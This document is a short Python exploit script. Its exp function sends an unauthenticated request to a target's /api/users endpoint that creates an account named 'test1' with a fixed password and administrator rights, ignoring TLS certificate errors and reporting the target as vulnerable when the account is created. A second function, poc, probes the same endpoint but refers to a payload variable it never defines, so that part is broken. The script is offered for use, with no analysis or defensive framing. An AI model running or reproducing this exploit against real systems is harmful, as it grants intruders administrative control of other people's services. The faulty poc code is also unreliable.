# coding:utf-8
import requests
import json

def exp(url):
    url = url if "//" in url else "http://"+url
    url = url + '/api/users'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Content-Type': 'application/json',
        }
    payload = {
        "username": "test1",
        "email": "test1@qq.com",
        "realname": "test1",
        "password": "Aa123456",
        "comment": "test1",
        "has_admin_role": True
        }
        
    payload = json.dumps(payload)
    try:
        requests.packages.urllib3.disable_warnings()
        r = requests.post(url, headers=headers, data=payload, timeout=2, verify=False)
        if r.status_code == 201:
            return url
    except Exception as e:
        pass



def poc(url):
    base = url if "//" in url else "http://"+url
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Content-Type': 'application/json',
        }
    # 可访问
    try:    
        r = requests.post(base+"/api/users", headers=headers, data=payload, timeout=5, verify=False)
    #出现响应，说明可注册
        if  "UnAuthorize" in r.text:
            return base
    
    # 超时或不可注册    
        else:    
            return False
        
    except:
        return False
    
